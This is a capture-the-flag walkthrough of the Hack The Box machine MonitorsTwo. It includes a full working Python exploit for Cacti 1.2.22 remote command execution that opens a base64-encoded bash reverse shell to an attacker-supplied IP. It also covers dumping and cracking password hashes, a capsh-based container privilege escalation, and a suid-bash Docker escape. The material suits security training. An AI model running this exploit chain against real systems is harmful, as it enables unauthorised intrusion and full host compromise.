# HTB: MonitorsTwo Walkthrough

## Initial Scan

First, we will start with an `nmap` scan to check what services are available:

```bash
kali@kali:~$ nmap -sV 10.10.11.211 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 21:02 EDT
Nmap scan report for 10.10.11.211
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Fairly narrow attack service, so lets start exploring the web service.

## Website Enumeration

Checking out port 80 reveals that there is a Cacti installation:

![htb_monitorstwo_cacti](https://guffre.github.io/assets/images/htb_monitorswo_cacti.jpg)

If you are not familiar with Cacti, here is the "What is Cacti?" blurb from the website:

> Cacti is a robust performance and fault management framework and a frontend to
> RRDTool - a Time Series Database (TSDB). It stores all of the necessary information to
> create performance management Graphs in either MariaDB or MySQL, and then leverages its
> various Data Collectors to populate RRDTool based TSDB with that
> performance data.

I checked out searchsploit, since we are given a service and version number:

```bash
kali@kali:/usr/share/nmap/scripts$ searchsploit cacti 1.2.22
-----------------------------------------------------------------------
 Exploit Title                                   |  Path
-----------------------------------------------------------------------
Cacti v1.2.22 - Remote Command Execution (RCE)   | php/webapps/51166.py
-----------------------------------------------------------------------
```

Well how fortunate!

## Initial Access

The included exploit did not work for me off the bat. I had to modify it a little bit in order to get it to work. I figured out to modify it by comparing it to metasploits version which states:

>    X_FORWARDED_FOR_IP  127.0.0.1        yes       The IP to use in the X-Forwarded-For HTTP header. This should be resolvable to a hostname in the poller table.

That meant that I needed to change the headers in the script:

```python
    def exploit(self):
        # cacti local ip from the url for the X-Forwarded-For header
        local_cacti_ip  = self.url.split("//")[1].split("/")[0]

        headers = {
            'X-Forwarded-For': f'{local_cacti_ip}'
        }
```

I replaced that section with the much more succint:

```python
headers = {'X-Forwarded-For': '127.0.0.1' }
```

I also made the script support multiprocessing, just in case the brute force would take a while. This turned out to be unnecessary, but here is the modified exploit:

```python
#!/usr/bin/env python3
import argparse
import base64
import httpx, urllib
from multiprocessing import Queue
from multiprocessing import Process

def run_exploit(queue):
    session = httpx.Client(headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"},verify=False,proxies=None)
    headers = {'X-Forwarded-For': '127.0.0.1'}
    while not queue.empty():
        url = queue.get()
        r = session.get(url,headers=headers,timeout=None)
        print(f"{url}:{r.status_code}\n{r.text}" )

def make_payload_queue(url, remote_ip, remote_port):
    revshell = f"bash -c 'exec bash -i &>/dev/tcp/{remote_ip}/{remote_port} <&1'"
    b64_revshell = base64.b64encode(revshell.encode()).decode()
    payload = f";echo {b64_revshell} | base64 -d | bash -"
    payload = urllib.parse.quote(payload)

    urls = Queue()
    # Adjust the range to fit your needs ( wider the range, longer the script will take to run the more success you will have achieving a reverse shell)
    for host_id in range(1,100):
        for local_data_ids in range(1,100):
            urls.put(f"{url}/remote_agent.php?action=polldata&local_data_ids[]={local_data_ids}&host_id={host_id}&poller_id=1{payload}")
    return urls

def parse_args():
    argparser = argparse.ArgumentParser()
    argparser.add_argument("-u", "--url", help="Target URL (e.g. http://192.168.1.100/cacti)")
    argparser.add_argument("-p", "--remote_port", help="reverse shell port to connect to", required=True)
    argparser.add_argument("-i", "--remote_ip", help="reverse shell IP to connect to", required=True)
    argparser.add_argument("-t", "--process_threads", type=int, help="number of process threads to spawn", required=True)
    return argparser.parse_args()

def main() -> None:
    # Open a nc listener (rs_host+rs_port) and run the script against a CACTI server with its LOCAL IP URL
    args = parse_args()
    queue = make_payload_queue(args.url, args.remote_ip, args.remote_port)
    processes = []
    for n in range(args.process_threads):
        p = Process(target=run_exploit, args=(queue,))
        processes.append(p)
        p.start()
    for p in processes:
        p.join()

if __name__ == "__main__":
    main()


```

Catching the callback with a netcat listener gets me a shell on the box!

## Docker Enumeration

After looking around the box, I landed on the `/entrypoint.sh` file:

```bash
!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
 mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
 mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
 mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
```

This points us directly to the `user_auth` table inside of the database, and shows us how to connect to it:

```bash
mysql -h db -u root --password=root cacti -e "select * from user_auth;"
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC  0 Jamie Thompson  admin@monitorstwo.htb
3       guest   43e9a4ab75570f5b        0       Guest Account           
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C  0 Marcus Brune    marcus@monitorstwo.htb
```

I then went to crack these hashes using hashcat with a GPU:

```powershell
PS D:\> .\hashcat.exe --identify .\hash.txt
The following 4 hash-modes match the structure of your input hash:
      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

I'm pretty positive these are "3200 - Unix" type, so I start my attack with rockyou:

```bash
PS D:\> .\hashcat.exe -m 3200 -a 0 .\hash.txt "E:\Toolbox\wordlists\rockyou.txt"
```

After a short period of time, I get a match with `marcus:funkymonkey`

## Docker Privesc

The other significant bit was the docker privesc. The first good indicator I found was checking for file permissions:

```bash
find / -perm /4000 -ls 2>/dev/null
    42364     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
    42417     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
    42317     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
    42314     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
    42407     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
     5431     32 -rwsr-xr-x   1 root     root        30872 Oct 14  2020 /sbin/capsh
    41798     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /bin/mount
    41819     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /bin/umount
    41813     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /bin/su

```

`capsh` or "capabilities shell" is pretty interesting to see in that output. Let's examine what capabilities we have access to:

```bash
www-data@50bca5e748b0:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@50bca5e748b0:/var/www/html$ capsh --print
Current: cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=eip
Bounding set =cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: cap_chown,!cap_dac_override,!cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,!cap_linux_immutable,cap_net_bind_service,!cap_net_broadcast,!cap_net_admin,cap_net_raw,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,cap_sys_chroot,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,cap_audit_write,!cap_audit_control,cap_setfcap,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=33(root) euid=0(root)
gid=33(www-data)
groups=33(www-data)
Guessed mode: UNCERTAIN (0)
```

Ok so that's a lot of capabilities, but seeing `cap_setuid` in the list is the ticket. To get a root shell you just need to invoke it:

```bash
capsh -- -p
```

Here is a breakdown of each part of the command:

- `capsh` - invokes the `capsh` command-line utility.
- `--` - states that all following arguments are for `/bin/bash`
- `-p` - From the bash manual, if the `-p` option is supplied at invocation the effective user id is not reset. Since we have `cap_setuid`, this will give us an effective user id of 0.

The result:

```bash
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

## Root Privesc

I felt the root privesc was both simple and tricky at the same time.  From the docker container, when you run the `mount` command you get the following info:

```bash

www-data@50bca5e748b0:/var/www/html$ mount
overlay on / type overlay (rw,relatime,lowerdir= <snip>
upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,
workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,
xino=off)
```

Using the marcus creds we obtained, from an SSH session we can look at those directories:

```bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff$ ls -al
total 108
drwxr-xr-x 7 root root  4096 Mar 21 10:49 .
drwx-----x 5 root root  4096 May  2 16:08 ..
drwxr-xr-x 2 root root  4096 Mar 22 13:21 bin
drwx------ 2 root root  4096 Mar 21 10:50 root
drwxr-xr-x 4 root root  4096 May  2 19:11 run
drwxrwxrwt 4 root root 69632 May  3 01:43 tmp
drwxr-xr-x 4 root root  4096 Nov 15 04:13 var

```

With root access on the docker container, I set the `suid` bit on the `/bin/bash` executable. Then, from the SSH session I can see that binary in the `diff` folder:

```bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/bin$ ls -al
total 1220
drwxr-xr-x 2 root root    4096 Mar 22 13:21 .
drwxr-xr-x 7 root root    4096 Mar 21 10:49 ..
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 bash

```

From there, getting root is a command away:

```bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/bin$ ./bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) egid=0(root) groups=0(root),1000(marcus)
```
